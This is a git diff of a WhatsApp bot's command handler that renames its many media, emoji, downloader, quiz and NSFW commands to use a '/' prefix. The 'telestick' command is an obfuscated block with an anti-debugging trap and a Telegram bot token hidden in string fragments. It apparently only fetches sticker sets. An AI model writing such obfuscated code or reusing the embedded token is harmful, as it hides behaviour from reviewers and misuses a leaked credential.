  waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5187,7 +5188,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animetickle': {
+case '/animetickle': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5195,7 +5196,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animegecg': {
+case '/animegecg': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5203,7 +5204,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'dogwoof': {
+case '/dogwoof': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5211,7 +5212,7 @@ ZeroStickWait()
                 })
                 }
 break
-case '8ballpool': {
+case '/8ballpool': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5219,7 +5220,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'goosebird': {
+case '/goosebird': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5227,7 +5228,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animefeed': {
+case '/animefeed': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5235,7 +5236,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeavatar': {
+case '/animeavatar': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5243,7 +5244,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'lizardpic': {
+case '/lizardpic': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5251,7 +5252,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'catmeow': {
+case '/catmeow': {
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
             await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
@@ -5259,68 +5260,68 @@ ZeroStickWait()
                 })
                 }
 break
-    case 'igemoji': 
-case 'instagramemoji': 
-if (!q) return replygcZero("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
+    case '/igemoji': 
+case '/instagramemoji': 
+if (!q) return replygcZero("Enter emoji, maximum 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "11")
 break
-case 'iphoneemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/iphoneemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "0")
 break
-case 'googleemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/googleemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "1")
 break
-case 'samsungemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/samsungemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "2")
 break
-case 'microsoftemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/microsoftemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "3")
 break
-case 'whatsappemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/whatsappemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "4")
 break
-case 'twitteremoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/twitteremoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "5")
 break
-case 'facebookemoji': 
-case 'fbemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/facebookemoji': 
+case '/fbemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "6")
 break
-case 'skypeemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/skypeemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "7")
 break
-case 'joyemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/joyemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "8")
 break
-case 'mojiemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/mojiemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "9")
-case 'pediaemoji': 
-if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+case '/pediaemoji': 
+if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
 ZeroStickWait()
 emote(q, "10")
 break
-case 'emoji': {
+case '/emoji': {
 if (!args.join(" ")) return replygcZero('Where is the emoji?')
 emoji.get(args.join(" ")).then(async(emoji) => {
 let mese = await client.sendMessage(from, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
@@ -5328,8 +5329,8 @@ await client.sendMessage(from, {text:"reply #s to this image to make sticker"}, 
 })
 }
 break
-case 'volume': {
-if (!args.join(" ")) return replygcZero(`Example: ${prefix + command} 10`)
+case '/volume': {
+if (!args.join(" ")) return replygcZero(`Example: ${prefixo + command} 10`)
 media = await client.downloadAndSaveMediaMessage(quoted, "volume")
 if (isQuotedAudio) {
 rname = getRandom('.mp3')
@@ -5354,7 +5355,7 @@ replygcZero("Send video/audio")
 }
 }
 break
- case 'tinyurl':{
+ case '/tinyurl':{
    if(!q) return replygcZero('link?')
    const request = require('request')
    request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
@@ -5366,8 +5367,8 @@ break
   })
   }
  break
-case 'git': case 'gitclone':
-if (!args[0]) return replygcZero(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/Media`)
+case '/git': case '/gitclone':
+if (!args[0]) return replygcZero(`Where is the link?\nExample :\n${prefixo}${command} https://github.com/DGXeon/Media`)
 if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcZero(`Link invalid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
@@ -5376,7 +5377,7 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
     client.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcZero(mess.error))
 break
-case "spotify":{
+case "/spotify":{
 if (!isPrem) return replyprem(mess.premium)
 if (!text) return replygcZero(`Where is the link?`)
         const Spotify = require('./lib/spotify')
@@ -5392,7 +5393,7 @@ if (!text) return replygcZero(`Where is the link?`)
         await client.sendMessage(from, { audio: bufferpotify }, { quoted: response })
         }
 break
-case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
+case '/bass': case '/blown': case '/deep': case '/earrape': case '/fast': case '/fat': case '/nightcore': case '/reverse': case '/robot': case '/slow': case '/smooth': case '/squirrel':
                 try {
                 let set
                 if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
@@ -5418,12 +5419,12 @@ case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat':
                 client.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                 fs.unlinkSync(ran)
                 })
-                } else replygcZero(`Reply to the audio you want to change with a caption *${prefix + command}*`)
+                } else replygcZero(`Reply to the audio you want to change with a caption *${prefixo + command}*`)
                 } catch (e) {
                 replygcZero(e)
                 }
                 break
-                case 'udict': 
+                case '/udict': 
 if (!q) return replygcZero(`What do you want to define?`)
 try {
 targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
@@ -5442,79 +5443,79 @@ const reply = `
     return replygcZero(`*${q}* isn't a valid text`)
     }
     break
-                case 'can': {
-            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefix + command} i dance?`)
+                case '/can': {
+            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} i dance?`)
             	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                 let keh = bisa[Math.floor(Math.random() * bisa.length)]
                 let jawab = `*Can ${text}*\nAnswer : ${keh}`
             await replygcZero(jawab)
             }
             break
-            case 'is': {
-            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefix + command} she virgin?`)
+            case '/is': {
+            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} she virgin?`)
             	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                 let kah = apa[Math.floor(Math.random() * apa.length)]
                 let jawab = `*Is ${text}*\nAnswer : ${kah}`                
             await replygcZero(jawab)
             }
             break
-            case 'when': {
-            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefix + command} will i get married?`)
+            case '/when': {
+            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} will i get married?`)
             	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                 let koh = kapan[Math.floor(Math.random() * kapan.length)]
                 let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
             await replygcZero(jawab)
             }
             break
-case 'what': {
-            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefix + command} is your name?`)
+case '/what': {
+            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} is your name?`)
             	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                 let kah = lel[Math.floor(Math.random() * lel.length)]
                 let jawab = `*What ${text}*\nAnswer : ${kah}`                
             await replygcZero(jawab)
             }
             break
-case 'where': {
-if (!text) return replygcZero(`Ask question\n\nExample : ${prefix + command} is your name?`)
+case '/where': {
+if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} is your name?`)
             	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                 let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                 let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
             await replygcZero(jawab)
             }
             break
-case 'how': {
-            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefix + command} to date girl?`)
+case '/how': {
+            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} to date girl?`)
             	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                 let kah = gimana[Math.floor(Math.random() * gimana.length)]
                 let jawab = `*How ${text}*\nAnswer : ${kah}`                
             await replygcZero(jawab)
             }
             break
-case 'rate': {
-            	if (!text) return replygcZero(`Example : ${prefix + command} my profile`)
+case '/rate': {
+            	if (!text) return replygcZero(`Example : ${prefixo + command} my profile`)
             	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                 let kah = ra[Math.floor(Math.random() * ra.length)]
                 let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
             await replygcZero(jawab)
             }
             break
-            case 'runtime': {
+            case '/runtime': {
             	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                 replygcZero(lowq)
             	}
             break
-            case 'stupidcheck':case 'uncleancheck':
-case 'hotcheck': case 'smartcheck':
-case 'greatcheck':
-case 'evilcheck':case 'dogcheck':
-case 'coolcheck':
-case 'waifucheck':
+            case '/stupidcheck':case '/uncleancheck':
+case '/hotcheck': case '/smartcheck':
+case '/greatcheck':
+case '/evilcheck':case '/dogcheck':
+case '/coolcheck':
+case '/waifucheck':
 cantik = body.slice(1)
 const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 const Zerokak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
 client.sendMessage(from, { text: Zerokak }, { quoted: m })
 break
-            case 'soulmate': {
+            case '/soulmate': {
             if (!m.isGroup) return ZeroStickGroup()
             let member = participants.map(u => u.id)
             let me = m.sender
@@ -5539,7 +5540,7 @@ isForwarded: true,
 { quoted: m})        
             }
             break
- case 'couple': {
+ case '/couple': {
             if (!m.isGroup) return ZeroStickGroup()
             let member = participants.map(u => u.id)
             let orang = member[Math.floor(Math.random() * member.length)]
@@ -5563,11 +5564,11 @@ isForwarded: true,
 { quoted: m})        
             }
             break
-                        case 'coffee': case 'kopi': {
+                        case '/coffee': case '/kopi': {
                 client.sendMessage(from, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
             }
             break
-            case 'wallpaper': {
+            case '/wallpaper': {
                 if (!text) return replygcZero('Enter Query Title')
                 ZeroStickWait()
 		let { wallpaper } = require('./lib/scraper')
@@ -5576,7 +5577,7 @@ isForwarded: true,
                 client.sendMessage(from, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
             }
             break
-            case 'wikimedia': {
+            case '/wikimedia': {
                 if (!text) return replygcZero('Enter Query Title')
                 ZeroStickWait()
 		let { wikimedia } = require('./lib/scraper')
@@ -5585,9 +5586,9 @@ isForwarded: true,
                 client.sendMessage(from, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
             }
             break
-            case 'pick': {
+            case '/pick': {
             	if (!m.isGroup) return ZeroStickGroup()
-            	if (!text) return replygcZero(`What do you want to pick?\nExample: ${prefix + command} idiot`)
+            	if (!text) return replygcZero(`What do you want to pick?\nExample: ${prefixo + command} idiot`)
              const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat)
                  .catch((e) => {}) : ""
              const participants = m.isGroup ? await groupMetadata.participants : ""
@@ -5614,15 +5615,15 @@ mentionedJid:[Zeroshimts],
 }, { quoted: m })
          }
      break
-     case "igvid": case "instavid": {
-if (!text) return replygcZero(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
+     case "/igvid": case "/instavid": {
+if (!text) return replygcZero(`Where is the link?\n\nExample : ${prefixo + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
 ZeroStickWait()
 let resZeroyinsta = await ZeroInstaMp4(text)
 const gha1 = await client.sendMessage(from,{video:{url: resZeroyinsta.url[0].url},caption: mess.success},{quoted:m})
 }
 break
-case 'igstalk': {
-if (!args[0]) return replygcZero(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_Zero13`)
+case '/igstalk': {
+if (!args[0]) return replygcZero(`Enter Instagram Username\n\nExample: ${prefixo + command} unucorn_Zero13`)
 const fg = require('api-dylux')
     try {
     let res = await fg.igStalk(args[0])
@@ -5642,8 +5643,8 @@ const fg = require('api-dylux')
       }
 }
 break
-           case "igimg": case "instaimg":  {
-if (!text) return replygcZero(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
+           case "/igimg": case "/instaimg":  {
+if (!text) return replygcZero(`Where is the link?\n\nExample : ${prefixo + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
 ZeroStickWait()
 const risponsZero = await ZeroIgImg(text)
 for (let i=0;i<risponsZero.length;i++) {
@@ -5651,21 +5652,21 @@ let ghd = await client.sendFileUrl(m.chat, risponsZero[i], `Here you go!`, m)
 }
 }
 break 
-case "fbvid": case "facebookvid":{
-if (!text) return replygcZero(`Where is the url?\n\nExample: ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
+case "/fbvid": case "/facebookvid":{
+if (!text) return replygcZero(`Where is the url?\n\nExample: ${prefixo + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
 ZeroStickWait()
 let res = await ZeroFb(q)
 let ghdp = await client.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
 }
 break
-case "twittervid":case "twitvid":{
-if (!text) return replygcZero(`Where is the url?\n\nExample: ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
+case "/twittervid":case "/twitvid":{
+if (!text) return replygcZero(`Where is the url?\n\nExample: ${prefixo + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
 ZeroStickWait()
 let res = await ZeroTwitter(q)
 let ghdx = await client.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
 }
 break
-    case 'saybengali': case 'ttsbengali': case 'gttsbengali':{
+    case '/saybengali': case '/ttsbengali': case '/gttsbengali':{
         if (!text && m.quoted) {
             message = `${m.quoted ? m.quoted.msg : ""}`;
           } else if (args[0]) {
@@ -5688,7 +5689,7 @@ break
             m.reply(`An error Occurd !`);
           });}
         break
-        case 'sayhindi': case 'ttshindi': case 'gttshindi':{
+        case '/sayhindi': case '/ttshindi': case '/gttshindi':{
             if (!text && m.quoted) {
                 message = `${m.quoted ? m.quoted.msg : ""}`;
               } else if (args[0]) {
@@ -5711,7 +5712,7 @@ break
                 m.reply(`An error Occurd !`);
               });}
             break
-            case 'sayspanish': case 'ttsspanish': case 'gttsspanish':{
+            case '/sayspanish': case '/ttsspanish': case '/gttsspanish':{
                 if (!text && m.quoted) {
                     message = `${m.quoted ? m.quoted.msg : ""}`;
                   } else if (args[0]) {
@@ -5734,7 +5735,7 @@ break
                     m.reply(`An error Occurd !`);
                   });}
                 break
-                case 'sayjapan': case 'ttsjapan': case 'gttsjapan':{
+                case '/sayjapan': case '/ttsjapan': case '/gttsjapan':{
                     if (!text && m.quoted) {
                         message = `${m.quoted ? m.quoted.msg : ""}`;
                       } else if (args[0]) {
@@ -5757,19 +5758,19 @@ break
                         m.reply(`An error Occurd !`);
                       });}
                     break
-        case 'telestick': { //credit agan
+        case '/telestick': { //credit agan
         	if (m.isGroup) return ZeroStickPrivate()
         if (!isPrem) return replyprem(mess.premium)
 function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await client[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
         }
     break
-    case 'fact': {
+    case '/fact': {
     	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
         return replygcZero(`${themeemoji} *Fact:* ${data.fact}\n`)   
     }
     break
     
-case 'myip': {
+case '/myip': {
         if (!ZeroTheCreator) return ZeroStickOwner()
         if (m.isGroup) return ZeroStickPrivate()
                 var http = require('http')
@@ -5784,10 +5785,10 @@ case 'myip': {
                 })
             }
         break
-        case 'mathquiz': case 'math': {
+        case '/mathquiz': case '/math': {
                 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                 let { genMath, modes } = require('./lib/math')
-                if (!text) return replygcZero(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
+                if (!text) return replygcZero(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefixo}math medium`)
                 let result = await genMath(text.toLowerCase())
                 client.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                     kuismath[m.sender.split('@')[0]] = result.jawaban
@@ -5800,8 +5801,8 @@ case 'myip': {
                 }
             }
             break
-            case 'lyrics': {
-if (!text) return replygcZero(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
+            case '/lyrics': {
+if (!text) return replygcZero(`What lyrics you looking for?\nExample usage: ${prefixo}lyrics Thunder`)
 ZeroStickWait()
 const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
 const result = await lyricsv2(text).catch(async _ => await lyrics(text))
@@ -5815,7 +5816,7 @@ replygcZero(`
 `.trim())
 }
 break
-case 'gdrive': {
+case '/gdrive': {
 		if (!args[0]) return replygcZero(`Enter the Google Drive link`)
 	ZeroStickWait()
 	const fg = require('api-dylux')
@@ -5832,10 +5833,10 @@ case 'gdrive': {
   }
 }
 break
-case 'invite': {
+case '/invite': {
 	if (!m.isGroup) return ZeroStickGroup()
 	if (!isBotAdmins) return ZeroStickBotAdmin()
-if (!text) return replygcZero(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 917404854406`)
+if (!text) return replygcZero(`Enter the number you want to invite to the group\n\nExample :\n*${prefixo + command}* 917404854406`)
 if (text.includes('+')) return replygcZero(`Enter the number together without *+*`)
 if (isNaN(text)) return replygcZero(`Enter only the numbers plus your country code without spaces`)
 let group = m.chat
@@ -5844,7 +5845,7 @@ let link = 'https://chat.whatsapp.com/' + await client.groupInviteCode(group)
         replygcZero(` An invite link is sent to the user`) 
 }
 break
-case "xnxxdl": {
+case "/xnxxdl": {
 	if (!isPrem) return replyprem(mess.premium)
 	if (!m.isGroup) return ZeroStickGroup()
 	if (!AntiNsfw) return replygcZero(mess.nsfw)
@@ -5860,7 +5861,7 @@ client.sendMessage(from, { caption: `≡  *XNXX DL*
 ▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
 }
 break
-case 'xnxxsearch': {
+case '/xnxxsearch': {
 	if (!isPrem) return replyprem(mess.premium)
 	if (!m.isGroup) return ZeroStickGroup()
 	if (!AntiNsfw) return replygcZero(mess.nsfw)
@@ -5872,7 +5873,7 @@ case 'xnxxsearch': {
               if (res.status) replygcZero(ff)
               }
               break
-              case 'pinterest': {
+              case '/pinterest': {
               	if (!text) return replygcZero(`Enter Query`)
 ZeroStickWait()
 let { pinterest } = require('./lib/scraper')
@@ -5881,15 +5882,15 @@ result = anutrest[Math.floor(Math.random() * anutrest.length)]
 client.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
 }
 break
-case 'ringtone': {
